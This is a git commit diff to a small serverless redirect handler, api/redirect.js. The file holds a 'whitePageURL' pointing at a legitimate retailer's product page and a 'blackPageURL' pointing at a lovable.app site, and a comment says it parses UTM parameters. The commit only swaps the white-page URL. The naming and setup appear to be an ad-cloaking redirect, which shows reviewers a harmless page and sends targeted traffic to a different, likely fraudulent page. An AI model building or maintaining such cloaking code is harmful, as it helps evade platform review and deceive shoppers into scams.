894601fb1107caf7797ab9122fbcca58964e3baa
ahmadfarhanwork <ahmadfarhanwork@gmail.com>
2025-11-10 07:24:59 +0500

    Update redirect.js

--- api/redirect.js
+++ api/redirect.js
@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.oshkosh.com.au/products/147039-carters-fleece-jumpsuit-baby-girl-1O546710?fr=678";
+    const whitePageURL = "https://www.blowesclothing.com.au/products/gant-poplin-shirt-gingham-light-blue-white";
     const blackPageURL = "https://luvcshap.lovable.app/?";
   
     // Parse the UTM parameters from the request URL
@@ -26,6 +26,7 @@ export default function handler(req, res) {
     res.end();
 
   }
+
 
 
 
